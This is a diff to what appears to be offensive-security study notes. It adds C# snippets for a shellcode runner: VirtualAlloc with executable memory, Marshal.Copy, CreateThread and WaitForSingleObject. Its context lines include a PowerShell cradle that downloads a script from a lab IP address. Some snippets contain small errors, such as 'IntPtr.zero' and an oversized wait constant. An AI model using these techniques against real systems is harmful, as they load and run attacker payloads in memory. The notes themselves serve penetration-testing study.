@@ -220,6 +220,41 @@ $proxyAddr = (Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\Curr
 $wc = New-Object System.Net.WebClient
 $wc.downloadstring('http://192.168.49.53/run2.ps1')
 ```
+# C# Shell
+
+### VirtualAlloc
+
+```csharp
+[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType,uint flProtect);  
+
+IntPtr addr = VirtualAlloc(IntPtr.zero, 0x1000, 0x3000, 0x40);
+```
+### CreateThread
+
+```csharp
+[DllImport("kernel32.dll")]
+static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+IntPtr hThread = CreateThread(IntPtr.zero, 0, addr, IntPtr.zero, 0, IntPtr.zero);
+```
+
+### Marshal.Copy
+
+```chsarp
+Marshal.Copy(buf, 0, addr, size);
+```
+
+### WaitForSingleObject
+
+```csharp
+[DllImport("kernel32.dll")]
+static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+WaitForSingleObject(hThread, 0xFFFFFFFFF);
+```
+
+
 # Process injection and migration
 
 Process is a container that created to host a application. Every process has its own virtual memory space.  
